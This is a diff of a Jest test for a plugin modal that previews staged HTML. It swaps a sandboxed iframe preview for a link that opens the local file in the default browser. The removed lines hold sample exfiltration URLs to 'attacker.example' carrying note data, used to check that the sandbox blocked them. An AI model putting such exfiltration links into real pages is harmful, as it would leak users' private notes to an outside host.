@@ -4,7 +4,10 @@ import type {
   SymposiumModalResult,
 } from "@/components/modals/SymposiumModal";
 import type { SymposiumReceipt } from "@/symposium/types";
+import { openWithSystemDefault } from "@/utils/openWithSystemDefault";
 import { act, fireEvent, screen } from "@testing-library/react";
+
+jest.mock("@/utils/openWithSystemDefault", () => ({ openWithSystemDefault: jest.fn() }));
 
 jest.mock("obsidian", () => ({
   App: class App {},
@@ -45,6 +48,8 @@ const REVIEW_HTML = "<!doctype html><html><body>Exact review</body></html>\n";
 const REVIEW: SymposiumDocumentReview = {
   sourcePath: "Notes/Architecture.md",
   digest: "a".repeat(64),
+  previewPath: "/tmp/copilot-symposium-preview/preview.html",
+  previewUrl: "file:///tmp/copilot-symposium-preview/preview.html",
   payload: Object.freeze({
     title: "Architecture",
     html: REVIEW_HTML,
@@ -107,6 +112,7 @@ describe("SymposiumModal", () => {
     }
     activeDocument.body.innerHTML = "";
     jest.restoreAllMocks();
+    jest.clearAllMocks();
   });
 
   describe("SymposiumModal", () => {
@@ -138,7 +144,7 @@ describe("SymposiumModal", () => {
         expect(publishModal.contentEl.childElementCount).toBeGreaterThan(0);
       });
 
-      it("shows the exact staged HTML in a sandboxed review and cancels without confirming", () => {
+      it("links to the exact local HTML in the default browser and cancels without confirming", () => {
         const onConfirm = createConfirmMock();
         const modal = renderModal(onConfirm, null, undefined, undefined, REVIEW, jest.fn());
         const baseClose = (modal as unknown as { baseClose: jest.Mock }).baseClose;
@@ -148,32 +154,15 @@ describe("SymposiumModal", () => {
         expect(screen.getByText(REVIEW.payload.title)).toBeTruthy();
         expect(screen.getByText(`${REVIEW.payload.byteLength} bytes`)).toBeTruthy();
         expect(screen.getByText(REVIEW.digest)).toBeTruthy();
-        const preview = screen.getByTitle("Symposium HTML preview");
-        expect(preview.getAttribute("srcdoc")).toBe(REVIEW_HTML);
-        expect(preview.getAttribute("sandbox")).toBe("allow-same-origin");
-        expect(preview.getAttribute("referrerpolicy")).toBe("no-referrer");
-        expect(preview.getAttribute("csp")).toBe(
-          "default-src 'none'; style-src 'unsafe-inline'; img-src data: blob:; font-src data:; media-src data: blob:"
-        );
-
-        const previewDocument = (preview as HTMLIFrameElement).contentDocument;
-        if (!previewDocument) throw new Error("Expected a same-origin preview document");
-        const link = previewDocument.createElement("a");
-        link.href = "https://attacker.example/?data=note";
-        link.textContent = "Link";
-        previewDocument.body.append(link);
-        fireEvent.load(preview);
-        expect(
-          link.dispatchEvent(new MouseEvent("click", { bubbles: true, cancelable: true }))
-        ).toBe(false);
-        const media = previewDocument.createElement("img");
-        media.src = "https://attacker.example/?data=note";
-        previewDocument.body.append(media);
-        for (const eventName of ["contextmenu", "dragstart"]) {
-          expect(
-            media.dispatchEvent(new MouseEvent(eventName, { bubbles: true, cancelable: true }))
-          ).toBe(false);
-        }
+        expect(screen.queryByTitle("Symposium HTML preview")).toBeNull();
+        expect(screen.getByText(/open the exact local html in your default browser/i)).toBeTruthy();
+        const previewLink = screen.getByRole("link", { name: "Open local HTML preview" });
+        expect(previewLink.getAttribute("href")).toBe(REVIEW.previewUrl);
+        expect(previewLink.getAttribute("title")).toBe(REVIEW.previewPath);
+        expect(previewLink.getAttribute("target")).toBe("_blank");
+        expect(previewLink.getAttribute("rel")).toBe("noopener noreferrer");
+        fireEvent.click(previewLink);
+        expect(openWithSystemDefault).toHaveBeenCalledWith(REVIEW.previewPath);
         expectButtonsInSameRow("Ask agent to regenerate", "No, cancel", "Yes, publish");
 
         fireEvent.click(screen.getByRole("button", { name: "No, cancel" }));
